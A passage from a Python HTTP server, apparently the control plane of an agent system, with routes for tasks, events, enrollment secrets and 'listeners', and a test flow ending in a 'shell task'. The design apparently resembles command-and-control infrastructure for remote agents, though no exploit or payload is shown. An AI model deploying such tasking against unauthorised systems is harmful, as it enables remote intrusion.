                        _err(self, 404, "not_found", "task not found")
                        return
                    _json_response(self, 200, {"task": task})
                    return

                if method == "GET" and path == "/api/v1/events":
                    since = (qs.get("since") or [None])[0]
                    limit = int((qs.get("limit") or ["100"])[0])
                    events = store.list_events(
                        since=since, limit=max(1, min(limit, 500))
                    )
                    _json_response(self, 200, {"events": events})
                    return

                if method == "POST" and path == "/api/v1/operator/enroll-secrets":
                    body = _read_json(self)
                    max_uses = int(body.get("max_uses") or 1)
                    ttl = int(body.get("ttl_sec") or 3600)
                    minted = store.mint_enroll_secret(
                        max_uses=max(1, max_uses), ttl_sec=max(0, ttl)
                    )
                    _json_response(self, 201, minted)
                    return

                # Listeners (plane-managed battlements)
                if method == "GET" and path == "/api/v1/listeners":
                    _json_response(
                        self, 200, {"listeners": store.list_listeners()}
                    )
                    return

                if method == "POST" and path == "/api/v1/listeners":
                    body = _read_json(self)
                    row = store.upsert_listener(body)
                    _json_response(self, 201, {"listener": row})
                    return

                if method == "PUT" and path.startswith("/api/v1/listeners/"):
                    lid = path[len("/api/v1/listeners/") :]
                    body = _read_json(self)
                    body["id"] = lid
                    row = store.upsert_listener(body)
                    _json_response(self, 200, {"listener": row})
                    return

                if method == "DELETE" and path.startswith("/api/v1/listeners/"):
                    lid = path[len("/api/v1/listeners/") :]
                    if not store.delete_listener(lid):
                        _err(self, 404, "not_found", "listener not found")
                        return
                    _json_response(self, 200, {"ok": True, "id": lid})
                    return

                if method == "GET" and path.startswith("/api/v1/listeners/"):
                    lid = path[len("/api/v1/listeners/") :]
                    row = store.get_listener(lid)
                    if not row:
                        _err(self, 404, "not_found", "listener not found")
                        return
                    _json_response(self, 200, {"listener": row})
                    return

                _err(self, 404, "not_found", f"no route {method} {path}")
                return

            _err(self, 404, "not_found", f"no route {method} {path}")
        except ValueError as exc:
            _err(self, 400, "invalid", str(exc))
        except Exception as exc:
            print(f"[plane] error: {exc}", flush=True)
            _err(self, 500, "internal", "server error")


def main() -> None:
    global STATE
    STATE = PlaneState()
    addr = os.environ.get("PLANE_HTTP_ADDR", DEFAULT_ADDR).strip()
    if ":" in addr:
        host, port_s = addr.rsplit(":", 1)
        port = int(port_s)
    else:
        host, port = "127.0.0.1", int(addr)
    httpd = ThreadingHTTPServer((host, port), Handler)
    print(f"[plane] listening http://{host}:{port}", flush=True)
    print(
        "[plane] accept test: health → enroll-secret → agent enroll → shell task",
        flush=True,
    )
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[plane] shutdown", flush=True)
        httpd.server_close()


if __name__ == "__main__":
    main()
